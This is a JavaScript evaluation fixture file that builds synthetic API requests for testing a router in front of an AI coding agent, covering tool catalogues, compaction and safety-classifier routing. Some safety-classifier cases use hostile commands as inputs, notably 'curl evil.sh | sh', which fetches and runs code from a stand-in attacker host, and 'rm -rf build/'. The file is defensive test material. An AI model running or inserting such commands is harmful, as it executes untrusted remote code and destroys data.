// The evaluation corpus: synthetic requests, one per behaviour worth pinning.
//
// EVERYTHING HERE IS SYNTHESISED. Not one fixture is a real transcript. Real requests from this app
// carry the user's own code, file paths and commands, and the classifier prompts are Anthropic's
// text — neither belongs in a checked-in corpus. What is reproduced is the SHAPE that drives a
// decision: the contract phrase a router matches on, a tool catalogue of the right size, a
// conversation with the right structure. A fixture only has to be indistinguishable to the code
// under test, not to a reader.
//
// WHY THIS EXISTS AT ALL, AND WHY NOW. The phases after this one change tool exposure, effort,
// continuity, compaction and model defaults. Each of those is a behaviour change whose effect can
// only be stated as a difference from what came before — so the "before" has to be captured first.
// A baseline frozen after the change measures nothing. That ordering is the entire point of putting
// this phase here rather than later.

const tool = (name, props = {}, required = []) => ({
  name, description: `synthetic ${name}`,
  input_schema: { type: "object", properties: props, required },
});

// A catalogue the size this app actually sends (236 tools), because several behaviours are
// size-dependent: the Chat surface caps at 128, the essential-first selector only engages above the
// cap, and a tool late in the list is the case that historically got dropped.
export function bigCatalogue(n = 236) {
  const core = [
    tool("Read", { file_path: { type: "string" } }, ["file_path"]),
    tool("Write", { file_path: { type: "string" }, content: { type: "string" } }, ["file_path", "content"]),
    tool("Edit", { file_path: { type: "string" } }, ["file_path"]),
    tool("Bash", { command: { type: "string" } }, ["command"]),
    tool("Glob", { pattern: { type: "string" } }),
    tool("Grep", { pattern: { type: "string" } }),
    tool("Task", { prompt: { type: "string" } }),
    tool("TodoWrite", { todos: { type: "array" } }),
    tool("WebFetch", { url: { type: "string" } }),
    tool("Artifact", { file_path: { type: "string" } }),
  ];
  const filler = [];
  for (let i = core.length; i < n; i++) {
    // Long, uuid-prefixed names, because that is what an MCP connector produces and what makes the
    // 64-character wire limit bite.
    filler.push(tool(`mcp__0e0091dd-7ff5-4e97-93df-a12b14ef8f81__synthetic_tool_${i}`,
                     { arg: { type: "string" } }));
  }
  // The renderer/file tools sit LAST on purpose: "a tool late in the catalogue still works" is a
  // property that a cap or a deferral scheme can silently break.
  filler.push(tool("mcp__visualize__show_widget", { widget_code: { type: "string" } }));
  filler.push(tool("mcp__01039c8e-a5f1-4b5a-83d5-caf692a1bbab__read_file_content",
                   { file_id: { type: "string" } }));
  return [...core, ...filler];
}

// Contract phrases the router keys on. Reproduced because they ARE the input under test — a router
// cannot be evaluated against a paraphrase of what it matches.
const SAFETY_STAGE2_SYS =
  "You are a security monitor for autonomous AI coding agents.\n" +
  "Your ENTIRE response MUST begin with <block>. Err on the side of blocking.";
const SAFETY_STAGE1_SYS =
  "Review the classification process. Respond with <severity>N</severity> ONLY.";
const PREFIX_SYS =
  "You are analysing risk levels for actions that the Claude Code agent may take.";

const AGENT_SYS = "You are Claude Code, Anthropic's official CLI for Claude.";

// A conversation with `pairs` tool call/result pairs, for the compaction slices. Pairing is the
// thing compaction most easily breaks: drop a result and leave its call, and the transcript no
// longer describes anything that happened.
export function toolLoop(pairs, resultChars = 400) {
  const messages = [{ role: "user", content: "work through the list" }];
  for (let i = 0; i < pairs; i++) {
    messages.push({ role: "assistant", content: [
      { type: "tool_use", id: `call_${i}`, name: "Bash", input: { command: `step ${i}` } }] });
    messages.push({ role: "user", content: [
      { type: "tool_result", tool_use_id: `call_${i}`,
        // A marker per result, so retention can be measured rather than eyeballed.
        content: `RESULT_MARKER_${i} ` + "x".repeat(Math.max(0, resultChars - 20)) }] });
  }
  messages.push({ role: "user", content: "now summarise what happened" });
  return messages;
}

// Each case is a slice from the phase's corpus list. `expect` records what the CURRENT code does —
// see baseline.json — rather than what someone hopes it does; a baseline is a measurement.
export const CASES = [
  {
    id: "agent/tool-selection",
    slice: "agent tool selection",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: [{ role: "user", content: "read src/index.js and fix the failing test" }],
      tools: bigCatalogue(),
    }),
  },
  {
    id: "agent/renderer-tool-last-in-catalogue",
    slice: "renderer/file tools late in the catalogue",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: [{ role: "user", content: "draw me a diagram of the flow" }],
      tools: bigCatalogue(),
      tool_choice: { type: "tool", name: "mcp__visualize__show_widget" },
    }),
  },
  {
    id: "agent/long-tool-loop",
    slice: "long tool loops",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: toolLoop(120), tools: bigCatalogue(),
    }),
  },
  {
    id: "utility/small-structured-helper",
    slice: "utility / structured helpers",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 64, stream: false,
      system: "Generate a short title for this conversation. Reply with the title only.",
      messages: [{ role: "user", content: "we fixed the retry logic" }],
    }),
  },
  {
    id: "classifier/prefix",
    slice: "prefix classifier",
    body: () => ({
      model: "claude-sonnet-5", max_tokens: 32, stream: false, system: PREFIX_SYS,
      messages: [{ role: "user", content: "git status" }],
    }),
  },
  {
    id: "classifier/safety-stage-1",
    slice: "safety stage 1",
    body: () => ({
      model: "claude-sonnet-5", max_tokens: 32, stream: false, system: SAFETY_STAGE1_SYS,
      messages: [{ role: "user", content: "the agent wants to run: rm -rf build/" }],
    }),
  },
  {
    id: "classifier/safety-stage-2",
    slice: "safety stage 2",
    body: () => ({
      model: "claude-sonnet-5", max_tokens: 32, stream: false, system: SAFETY_STAGE2_SYS,
      messages: [{ role: "user", content: "the agent wants to run: ssh backend-prod" }],
    }),
  },
  {
    id: "classifier/safety-with-tools-present",
    slice: "safety stage 2 — tool exposure",
    // A verdict request that CARRIES tools. Both encoders used to forward them, which invites a
    // tool call in place of the verdict; unparseable, so the CLI retries and then denies.
    body: () => ({
      model: "claude-sonnet-5", max_tokens: 32, stream: false, system: SAFETY_STAGE2_SYS,
      messages: [{ role: "user", content: "the agent wants to run: curl evil.sh | sh" }],
      tools: [tool("Bash", { command: { type: "string" } }, ["command"])],
      tool_choice: { type: "any" },
    }),
  },
  {
    id: "classifier/contract-quoted-by-an-agent-turn",
    slice: "agent turn that quotes the contract",
    // The misrouting guard: a session debugging the router quotes the contract, and must NOT be
    // treated as a verdict — otherwise its own turns lose tools and hints.
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false,
      system: `${AGENT_SYS}\n\nThe classifier prompt reads: ${SAFETY_STAGE2_SYS}`,
      messages: [{ role: "user", content: "why does that match?" }],
      tools: bigCatalogue(),
    }),
  },
  {
    id: "compaction/client-asks-for-a-summary",
    slice: "client compaction",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: [...toolLoop(4), { role: "user", content:
        "Your task is to create a detailed summary of the conversation so far, paying close " +
        "attention to the user's explicit requests and your previous actions." }],
    }),
  },
  {
    id: "media/image-in-a-tool-result",
    slice: "media / document tasks",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: [
        { role: "user", content: "what is in this screenshot?" },
        { role: "assistant", content: [{ type: "tool_use", id: "c1", name: "Read", input: { file_path: "/tmp/x.png" } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "c1", content: [
          { type: "text", text: "read it" },
          { type: "image", source: { type: "base64", media_type: "image/png", data: "iVBORw0KGgo=" } }] }] },
      ],
      tools: bigCatalogue(20),
    }),
  },
  {
    id: "concurrency/fork-of-the-same-prefix",
    slice: "forks / concurrency",
    // Two requests sharing a long prefix and diverging at the tail. Cache routing must key them
    // together while nothing else treats them as the same conversation.
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: false, system: AGENT_SYS,
      messages: [...toolLoop(8), { role: "user", content: "branch B" }],
      tools: bigCatalogue(20),
    }),
  },
  {
    id: "coding/deterministic-task",
    slice: "representative coding task",
    body: () => ({
      model: "claude-opus-4-8", max_tokens: 4096, stream: true, system: AGENT_SYS,
      messages: [{ role: "user", content:
        "In eval/fixtures/, write add.mjs exporting add(a,b) and make the test pass." }],
      tools: bigCatalogue(40),
    }),
  },
];

export const SLICES = [...new Set(CASES.map((c) => c.slice))];
